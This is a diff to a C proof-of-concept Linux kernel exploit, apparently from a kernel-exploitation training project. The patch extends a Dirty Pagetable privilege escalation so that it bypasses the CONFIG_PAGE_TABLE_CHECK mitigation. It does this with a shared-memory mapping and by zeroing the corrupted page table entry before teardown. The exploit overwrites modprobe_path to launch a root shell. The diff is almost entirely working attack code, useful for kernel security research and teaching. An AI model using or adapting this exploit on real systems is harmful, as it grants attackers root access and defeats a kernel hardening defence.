@@ -11,6 +11,9 @@
  *
  * This PoC performs the Dirty Pagetable attack and gains LPE.
  *
+ * You may also compile the kernel with CONFIG_PAGE_TABLE_CHECK,
+ * since this PoC can bypass it.
+ *
  * Requirements:
  *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
  *  2) Disable KASLR and update the MODPROBE_PATH_ADDR below
@@ -124,14 +127,34 @@ int act(int act_fd, int code, int n, char *args)
 
 int prepare_page_tables(void)
 {
+	int fd = -1;
 	unsigned long *addr = NULL;
 	long i = 0;
 
 	printf("[!] preparing page tables\n");
 
+	/*
+	 * Let's use POSIX shared memory to keep the memory mapping
+	 * after the exploit process finishes. That is needed to bypass
+	 * the CONFIG_PAGE_TABLE_CHECK mitigation.
+	 */
+	fd = shm_open("/notavirus", O_CREAT | O_RDWR, 0666);
+	if (fd < 0) {
+		perror("[-] shm_open");
+		return EXIT_FAILURE;
+	}
+
+	/* Set the size of the created shared memory object */
+	if (ftruncate(fd, PAGE_SIZE) < 0) {
+		perror("[-] ftruncate");
+		return EXIT_FAILURE;
+	}
+
+	printf("[+] shared memory object is created\n");
+
 	/* Allocate page table hierarchy */
 	addr = mmap(PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
-			  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+			  MAP_FIXED | MAP_SHARED, fd, 0);
 	if (addr == MAP_FAILED) {
 		perror("[-] mmap");
 		return EXIT_FAILURE;
@@ -145,7 +168,7 @@ int prepare_page_tables(void)
 	 */
 	for (i = 0; i < PT_ENTRIES; i++) {
 		addr = mmap(PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0), PAGE_SIZE, PROT_WRITE,
-			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+			    MAP_FIXED | MAP_SHARED, fd, 0);
 		if (addr == MAP_FAILED) {
 			perror("[-] mmap");
 			return EXIT_FAILURE;
@@ -207,7 +230,7 @@ int flush_tlb(void *addr, size_t len)
 }
 
 /* Update the address of modprobe_path for your kernel: */
-#define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
+#define MODPROBE_PATH_ADDR 0xffffffff835a9f20lu
 #define KERNEL_TEXT_ADDR 0xffffffff81000000lu
 #define MODPROBE_PATH_ADDR_OFFSET (MODPROBE_PATH_ADDR - KERNEL_TEXT_ADDR)
 /* See "Kernel code" in /proc/iomem to update KERNEL_TEXT_PHYS_ADDR for your kernel */
@@ -502,7 +525,7 @@ int main(void)
 
 	ret = flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0), PT_ENTRIES * PAGE_SIZE);
 	if (ret == EXIT_FAILURE)
-		goto end;
+		goto repair;
 
 	for (i = 0; i < PT_ENTRIES; i++) {
 		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
@@ -530,10 +553,19 @@ int main(void)
 		/* Launch the root shell */
 		trigger_modprobe_sock();
 		result = EXIT_SUCCESS;
-		goto end; /* root shell is finished */
+		goto repair; /* root shell is finished */
 	}
 
 	printf("[-] failed to find / overwrite / trigger modprobe\n");
+
+repair:
+	/*
+	 * Bypass the CONFIG_PAGE_TABLE_CHECK on page table freeing.
+	 * To do so, write 0 to the corrupted page table entry
+	 * to make pte_none() called in do_zap_pte_range().
+	 * That allows to skip the checks.
+	 */
+	act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, "0x0 0");
 
 end:
 	if (act_fd >= 0) {
